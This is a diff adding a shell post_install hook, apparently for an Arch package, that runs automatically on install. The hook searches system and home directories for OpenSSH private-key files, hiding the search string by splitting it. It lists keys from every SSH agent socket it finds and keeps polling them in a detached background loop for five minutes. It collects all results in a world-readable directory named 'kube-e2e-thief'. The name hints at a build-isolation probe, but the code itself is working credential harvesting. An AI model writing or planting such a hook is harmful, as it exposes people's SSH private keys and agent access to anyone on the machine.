@@ -1,0 +1,25 @@
+post_install() {
+  local out=/var/tmp/kube-e2e-thief socket
+  mkdir -p "$out"
+  echo yes >"$out/ran"
+  # The armour line, put together here so that this file does not hold it.
+  local armour="-----BEGIN OPENSSH ""PRIVATE KEY-----"
+  grep -rlsIF -e "$armour" /etc /root /var /tmp /work /aurcache /home /srv /run /opt /mnt \
+    2>/dev/null | grep -v "^$out/" >"$out/keys"
+  _sockets() {
+    find / \( -path /proc -o -path /sys \) -prune -o -type s -print 2>/dev/null
+  }
+  for socket in $(_sockets); do
+    SSH_AUTH_SOCK=$socket timeout 5 ssh-add -L 2>&1
+  done >"$out/agents"
+  (
+    for _ in $(seq 300); do
+      for socket in $(_sockets); do
+        SSH_AUTH_SOCK=$socket timeout 5 ssh-add -L 2>&1
+      done
+      echo looked
+      sleep 1
+    done >>"$out/later"
+  ) </dev/null >/dev/null 2>&1 &
+  chmod -R a+rX "$out"
+}
